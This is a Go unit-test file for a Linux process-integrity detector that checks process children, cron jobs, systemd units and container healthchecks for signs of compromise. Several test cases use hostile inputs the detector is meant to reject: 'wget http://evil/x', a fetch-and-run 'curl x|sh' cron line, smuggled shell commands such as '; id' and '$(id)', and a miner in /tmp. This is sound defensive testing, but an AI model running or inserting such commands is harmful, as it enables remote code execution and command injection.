// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Paul Borile

package engine

import (
	"os"
	"os/exec"
	"testing"
	"time"

	"github.com/paulborile/cenziadah/internal/container"
	"github.com/paulborile/cenziadah/internal/cron"
	"github.com/paulborile/cenziadah/internal/detector"
	"github.com/paulborile/cenziadah/internal/elfref"
	"github.com/paulborile/cenziadah/internal/model"
	"github.com/paulborile/cenziadah/internal/procfs"
	"github.com/paulborile/cenziadah/internal/systemd"
)

// TestCollectAndSnapshotSelf runs the real collection path against the current
// process (always readable), then builds a snapshot and runs detectors. This is a
// unit test of the wiring, not the integration compromise test.
func TestCollectAndSnapshotSelf(t *testing.T) {
	pid := os.Getpid()
	tgt, err := Collect(pid, true, nil)
	if err != nil {
		t.Fatalf("Collect: %v", err)
	}
	defer tgt.Mem.Close()

	if tgt.Desc.PID != pid || len(tgt.Regions) == 0 {
		t.Fatalf("collected target looks empty: %+v", tgt.Desc)
	}

	snap, err := BuildSnapshot(tgt)
	if err != nil {
		t.Fatalf("BuildSnapshot: %v", err)
	}
	if len(snap.Regions) == 0 {
		t.Error("snapshot has no regions")
	}
	// The Go test binary is a clean process: a baseline-less run of all detectors
	// should not crash and should produce a well-formed report.
	rep := Run(tgt, AllDetectors())
	if rep.Target.PID != pid {
		t.Errorf("report target pid = %d, want %d", rep.Target.PID, pid)
	}
}

func TestResolvePIDSelf(t *testing.T) {
	pid, err := ResolvePID(os.Getpid(), "")
	if err != nil || pid != os.Getpid() {
		t.Fatalf("ResolvePID self: pid=%d err=%v", pid, err)
	}
}

func TestResolvePIDNeedsSelector(t *testing.T) {
	if _, err := ResolvePID(0, ""); err == nil {
		t.Error("expected error when neither pid nor name given")
	}
}

// CollectInScan takes children from the cycle's ProcTable (direct only) and, with
// memory requested, annotates regions from smaps so the digest cache can work.
func TestCollectInScanSelf(t *testing.T) {
	pid := os.Getpid()
	tab, err := procfs.ReadProcTable()
	if err != nil {
		t.Fatal(err)
	}
	tgt, err := CollectInScan(pid, tab, true)
	if err != nil {
		t.Fatalf("CollectInScan: %v", err)
	}
	defer tgt.Mem.Close()
	if tgt.Desc.BuildID == "" {
		t.Error("test binary should have a build-id")
	}
	known := 0
	for _, r := range tgt.Regions {
		if r.AnonKnown {
			known++
		}
	}
	if known == 0 {
		t.Error("no region annotated from smaps")
	}
}

// Regression: building a snapshot without memory access (watch --no-mem, or no
// CAP_SYS_PTRACE) must record disk digests only, not dereference a nil mem handle.
func TestBuildSnapshotWithoutMem(t *testing.T) {
	tgt, err := Collect(os.Getpid(), false, nil)
	if err != nil {
		t.Fatal(err)
	}
	snap, err := BuildSnapshotCached(tgt, nil)
	if err != nil {
		t.Fatal(err)
	}
	if len(snap.Modules) == 0 {
		t.Fatal("expected module disk digests")
	}
	for _, m := range snap.Modules {
		if m.MemTextSHA != "" {
			t.Errorf("%s has a memory digest without memory access", m.Path)
		}
	}
}

// Regression: a child with an unreadable exe must not become an allow-list
// entry, or every later unreadable child (an exploit's shell) would be allowed.
func TestBuildSnapshotSkipsChildrenWithoutExe(t *testing.T) {
	tgt := &detector.Target{Children: []procfs.Child{{PID: 5, Exe: ""}, {PID: 6, Exe: "/usr/bin/ls"}}}
	snap, err := BuildSnapshot(tgt)
	if err != nil {
		t.Fatal(err)
	}
	if len(snap.Children) != 1 || snap.Children[0].Exe != "/usr/bin/ls" {
		t.Errorf("children = %+v, want only /usr/bin/ls", snap.Children)
	}
}

// The build-id comes from the running image (/proc/<pid>/exe), which still works
// after a package upgrade deletes the file at the exe path.
func TestCollectBuildIDFromRunningImage(t *testing.T) {
	tgt, err := Collect(os.Getpid(), false, nil)
	if err != nil {
		t.Fatal(err)
	}
	want, err := elfref.BuildID("/proc/self/exe")
	if err != nil || want == "" || tgt.Desc.BuildID != want {
		t.Errorf("BuildID = %q, want %q (%v)", tgt.Desc.BuildID, want, err)
	}
}

func TestIsShell(t *testing.T) {
	for exe, want := range map[string]bool{
		"/usr/bin/bash": true, "/bin/dash": true, "/usr/bin/zsh (deleted)": true,
		"/usr/bin/top": false, "/opt/victim": false, "": false,
	} {
		if got := isShell(exe); got != want {
			t.Errorf("isShell(%q) = %v, want %v", exe, got, want)
		}
	}
}

func TestSiblingCandidate(t *testing.T) {
	for _, c := range []struct {
		parent, child string
		want          bool
		why           string
	}{
		{"/usr/lib/postfix/sbin/master", "/usr/lib/postfix/sbin/tlsmgr", true, "postfix suite"},
		{"/usr/lib/postfix/sbin/master", "/usr/lib/postfix/sbin/smtpd (deleted)", true, "upgraded sibling"},
		{"/opt/google/chrome/chrome", "/opt/google/chrome/chrome_crashpad_handler", true, "chrome helper"},
		{"/usr/lib/postfix/sbin/master", "/bin/sh", false, "shell elsewhere"},
		{"/usr/lib/postfix/sbin/master", "/tmp/x", false, "dropped binary"},
		{"/usr/bin/node", "/usr/bin/sh", false, "shared dir /usr/bin"},
		{"/usr/sbin/apache2", "/usr/sbin/sendmail", false, "shared dir /usr/sbin"},
		{"/opt/app/venv/bin/gunicorn", "/opt/app/venv/bin/python3.12", false, "interpreter in a venv"},
		{"/opt/app/bin/server", "/opt/app/bin/bash", false, "shell in a dedicated dir"},
		{"/opt/app/bin/server", "/opt/app/bin/env", false, "env runs anything"},
		{"/opt/app/bin/server", "/opt/app/bin/nodeworker", true, "not an interpreter, just a name prefix"},
		{"", "/usr/lib/postfix/sbin/tlsmgr", false, "unknown parent"},
	} {
		if got := siblingCandidate(c.parent, c.child); got != c.want {
			t.Errorf("%s: siblingCandidate(%q, %q) = %v, want %v", c.why, c.parent, c.child, got, c.want)
		}
	}
}

func TestShimHealthcheck(t *testing.T) {
	const id = "88180067883ca53359dca427b62b6d15431607a442ba941a8cfd7c7fa1f0d46d"
	root := t.TempDir()
	dir := root + "/containers/" + id
	os.MkdirAll(dir, 0o755)
	os.WriteFile(dir+"/config.v2.json", []byte(`{"Config":{"Healthcheck":{"Test":["CMD-SHELL","dms-healthcheck"]}}}`), 0o600)
	saved := dockerRoot
	dockerRoot = func() string { return root }
	defer func() { dockerRoot = saved }()

	shim := model.TargetDesc{Exe: "/usr/bin/containerd-shim-runc-v2",
		Cmdline: "/usr/bin/containerd-shim-runc-v2 -namespace moby -id " + id + " -address /run/containerd/containerd.sock"}
	if got := shimHealthcheck(shim).Cmdline; got != "/bin/sh -c dms-healthcheck" {
		t.Errorf("shimHealthcheck = %q", got)
	}
	notShim := shim
	notShim.Exe = "/usr/sbin/apache2"
	if shimHealthcheck(notShim).Cmdline != "" {
		t.Error("only containerd shims get the healthcheck rule")
	}
}

// Trusted is set from the child's real binary: a package-installed program is
// trusted, the same program copied to a user-writable directory is not.
func TestChildTrustedMarking(t *testing.T) {
	if os.Getuid() == 0 {
		t.Skip("as root, temp files are root-owned")
	}
	copyPath := t.TempDir() + "/sleep-copy"
	b, err := os.ReadFile("/usr/bin/sleep")
	if err != nil {
		t.Skip(err)
	}
	os.WriteFile(copyPath, b, 0o755)
	sys := exec.Command("/usr/bin/sleep", "30")
	cp := exec.Command(copyPath, "30")
	if sys.Start() != nil || cp.Start() != nil {
		t.Skip("cannot start helpers")
	}
	defer func() { sys.Process.Kill(); cp.Process.Kill(); sys.Wait(); cp.Wait() }()

	tgt, err := Collect(os.Getpid(), false, nil)
	if err != nil {
		t.Fatal(err)
	}
	got := map[int]bool{}
	for _, c := range tgt.Children {
		got[c.PID] = c.Trusted
	}
	if !got[sys.Process.Pid] {
		t.Error("/usr/bin/sleep child should be Trusted")
	}
	if got[cp.Process.Pid] {
		t.Error("copy in a user temp dir must not be Trusted")
	}
}

func TestHealthcheckChild(t *testing.T) {
	wget := container.Healthcheck{Cmdline: "wget --spider http://localhost:8080/health", Program: "wget"}
	shell := container.Healthcheck{Cmdline: "/bin/sh -c dms-healthcheck"}
	for _, c := range []struct {
		hc    container.Healthcheck
		child procfs.Child
		want  bool
		why   string
	}{
		{wget, procfs.Child{Exe: "/usr/bin/wget", Cmdline: "wget --spider http://localhost:8080/health"}, true, "exact cmdline"},
		{wget, procfs.Child{Exe: "/usr/bin/wget", Cmdline: "wget http://evil/x"}, false, "different cmdline"},
		{wget, procfs.Child{Exe: "/usr/bin/wget", Exited: true}, true, "exited, cmdline gone (production glienicke case)"},
		{wget, procfs.Child{Exe: "/usr/bin/curl", Exited: true}, false, "exited, other program"},
		{wget, procfs.Child{Exe: "/usr/bin/wget"}, false, "alive with empty cmdline: no fallback"},
		{shell, procfs.Child{Exe: "/usr/bin/dash", Exited: true}, true, "shell form, exited shell"},
	} {
		if got := healthcheckChild(c.hc, c.child); got != c.want {
			t.Errorf("%s: %v, want %v", c.why, got, c.want)
		}
	}
}

func TestCronJobLookup(t *testing.T) {
	saved := cronJobs
	cronJobs = func(int) map[string]cron.Job {
		return map[string]cron.Job{"/bin/sh -c run-parts /etc/cron.daily": {Source: "/etc/crontab", Cmdline: "/bin/sh -c run-parts /etc/cron.daily"}}
	}
	defer func() { cronJobs = saved }()
	if got := CronJob(1, "/bin/sh -c run-parts /etc/cron.daily"); got != "/etc/crontab" {
		t.Errorf("CronJob = %q", got)
	}
	if CronJob(1, "/bin/sh -c curl x|sh") != "" || CronJob(1, "") != "" {
		t.Error("only exact, non-empty command lines of configured jobs match")
	}
	if !IsCron("/usr/sbin/cron") || !IsCron("/usr/sbin/crond") || IsCron("/usr/bin/crontab") {
		t.Error("IsCron")
	}
}

func TestSystemdUnitChild(t *testing.T) {
	savedUnit, savedLoad := unitOf, loadUnit
	defer func() { unitOf, loadUnit = savedUnit, savedLoad }()
	cg := map[int]string{10: "apt-daily.service", 20: "apache2.service", 30: ""}
	unitOf = func(pid int) string { return cg[pid] }
	units := map[string]systemd.Unit{
		"apt-daily.service": {Name: "apt-daily.service", Oneshot: true, Execs: []string{"/usr/lib/apt/apt.systemd.daily update"}},
		"apache2.service":   {Name: "apache2.service", Execs: []string{"/usr/sbin/apachectl start"}},
	}
	loadUnit = func(_ int, n string) (systemd.Unit, bool) { u, ok := units[n]; return u, ok }

	apt := procfs.Child{PID: 10, Exe: "/usr/bin/dash", Cmdline: "/bin/sh /usr/lib/apt/apt.systemd.daily update"}
	if got := systemdUnitChild(1, apt); got != "apt-daily.service" {
		t.Errorf("production apt-daily case: %q", got)
	}
	// a miner double-forked out of a compromised apache: re-parented to PID 1,
	// still in apache2.service's cgroup, not one of its Exec lines
	orphan := procfs.Child{PID: 20, Exe: "/tmp/.x/miner", Cmdline: "./miner -o pool"}
	if systemdUnitChild(1, orphan) != "" {
		t.Error("orphan in a service cgroup must not match")
	}
	if systemdUnitChild(1, procfs.Child{PID: 30, Exe: "/usr/bin/dash", Cmdline: "/bin/sh x"}) != "" {
		t.Error("no system unit: no match")
	}
	exited := apt
	exited.Exited = true
	if systemdUnitChild(1, exited) != "" {
		t.Error("an exited child's cgroup can no longer be read: no match")
	}
	if OneshotUnit(10) != "apt-daily.service" || OneshotUnit(20) != "" {
		t.Error("only Type=oneshot units are batch jobs")
	}
}

func TestLoadRealAptDailyUnit(t *testing.T) {
	if _, err := os.Stat("/usr/lib/systemd/system/apt-daily.service"); err != nil {
		t.Skip("no apt-daily.service here")
	}
	u, ok := loadUnit(1, "apt-daily.service")
	if !ok || !u.Oneshot || !u.Matches("/bin/sh /usr/lib/apt/apt.systemd.daily update", true) {
		t.Errorf("real apt-daily.service: %+v ok=%v", u, ok)
	}
}

func TestPackagedScript(t *testing.T) {
	// /usr/bin/ls stands in for a root-owned script under a dedicated program
	// directory: parent "/usr/app" makes /usr the parent's directory.
	pid := os.Getpid()
	const parent = "/usr/app"
	for _, c := range []struct {
		parent, exe, cmd, want, why string
	}{
		{parent, "/usr/bin/dash", `/bin/sh -c "/usr/bin/ls" 9757 452745`, "/usr/bin/ls", "VS Code shape"},
		{parent, "/usr/bin/dash", `/bin/sh -c /usr/bin/ls`, "/usr/bin/ls", "unquoted, no args"},
		{parent, "/usr/bin/bash", `bash /usr/bin/ls --x=1`, "/usr/bin/ls", "script as argument"},
		{parent, "/usr/bin/dash", `/bin/sh -c "/usr/bin/ls" 1; id`, "", "command smuggled after"},
		{parent, "/usr/bin/dash", `/bin/sh -c "/usr/bin/ls" $(id)`, "", "substitution"},
		{parent, "/usr/bin/dash", `/bin/sh -c "/usr/bin/ls 1`, "", "unbalanced quote"},
		{parent, "/usr/bin/dash", `/bin/sh -c id`, "", "not a path"},
		{parent, "/usr/bin/dash", `/bin/sh -c "/usr/bin/../bin/ls"`, "", "unclean path"},
		{parent, "/usr/bin/python3", `python3 /usr/bin/ls`, "", "interpreter, not a shell"},
		{"/usr/bin/app", "/usr/bin/dash", `/bin/sh -c /usr/bin/ls`, "", "parent in shared dir"},
		{"/opt/app/app", "/usr/bin/dash", `/bin/sh -c /usr/bin/ls`, "", "script outside parent's dir"},
		{"", "/usr/bin/dash", `/bin/sh -c /usr/bin/ls`, "", "unknown parent"},
	} {
		got := packagedScript(pid, c.parent, procfs.Child{Exe: c.exe, Cmdline: c.cmd})
		if got != c.want {
			t.Errorf("%s: packagedScript(%q, %q) = %q, want %q", c.why, c.parent, c.cmd, got, c.want)
		}
	}
	if os.Getuid() != 0 {
		dir := t.TempDir()
		os.WriteFile(dir+"/x.sh", []byte("#!/bin/sh\n"), 0o755)
		if got := packagedScript(pid, dir+"/app", procfs.Child{Exe: "/usr/bin/dash", Cmdline: "/bin/sh " + dir + "/x.sh"}); got != "" {
			t.Errorf("user-owned script accepted: %q", got)
		}
	}
}

// secretDetector reports a finding whose texts carry a secret.
type secretDetector struct{}

func (secretDetector) Name() string { return "secret" }
func (secretDetector) Inspect(*detector.Target) ([]model.Finding, error) {
	return []model.Finding{{
		Detail:   `cmd="tool --key ` + "waka_" + "11111111-2222-3333-4444-555555555555" + `"`,
		Evidence: map[string]any{"cmdline": "tool --password hunter2", "size": 4096},
	}}, nil
}

// What leaves cenziadah is redacted; the detectors saw the raw target.
func TestRunRedactsReport(t *testing.T) {
	tgt := &detector.Target{Desc: model.TargetDesc{PID: 1, Cmdline: "srv --token abc123"}}
	rep := Run(tgt, []detector.Detector{secretDetector{}})
	if rep.Target.Cmdline != "srv --token ***" {
		t.Errorf("target cmdline = %q", rep.Target.Cmdline)
	}
	if tgt.Desc.Cmdline != "srv --token abc123" {
		t.Errorf("the collected target itself must stay raw for the detectors, got %q", tgt.Desc.Cmdline)
	}
	f := rep.Findings[0]
	if f.Detail != `cmd="tool --key ***"` || f.Evidence["cmdline"] != "tool --password ***" || f.Evidence["size"] != 4096 {
		t.Errorf("finding not redacted: detail=%q evidence=%v", f.Detail, f.Evidence)
	}
}

// The module cache is keyed by the file itself: the same file through any
// process's /proc/<pid>/root is one entry, a file rewritten in place is a new
// one, and entries no sweep used are dropped.
func TestSweepCacheKeysByFileVersion(t *testing.T) {
	src, err := os.ReadFile("/usr/bin/true")
	if err != nil {
		t.Skip(err)
	}
	p := t.TempDir() + "/lib.so"
	if err := os.WriteFile(p, src, 0o755); err != nil {
		t.Fatal(err)
	}
	c := NewSweepCache()
	c.BeginSweep()
	m1, err := c.OpenModule(p, procfs.Region{})
	if err != nil {
		t.Fatal(err)
	}
	m2, _ := c.OpenModule("/proc/self/root"+p, procfs.Region{})
	if m1 != m2 || c.Modules() != 1 || m1.Stamp == "" {
		t.Fatalf("same file via two paths: m1=%p m2=%p modules=%d stamp=%q", m1, m2, c.Modules(), m1.Stamp)
	}
	c.EndSweep()

	c.BeginSweep()
	if m, _ := c.OpenModule(p, procfs.Region{}); m != m1 {
		t.Error("unchanged file must be reused in the next sweep")
	}
	future := time.Now().Add(time.Hour)
	if err := os.Chtimes(p, future, future); err != nil { // mtime and ctime change
		t.Fatal(err)
	}
	m3, _ := c.OpenModule(p, procfs.Region{})
	if m3 == m1 || m3.Stamp == m1.Stamp {
		t.Error("a file changed in place must be parsed again")
	}
	c.EndSweep()

	c.BeginSweep() // only the new version is mapped now
	c.OpenModule(p, procfs.Region{})
	c.EndSweep()
	if c.Modules() != 1 {
		t.Errorf("modules = %d, want only the current version", c.Modules())
	}
}
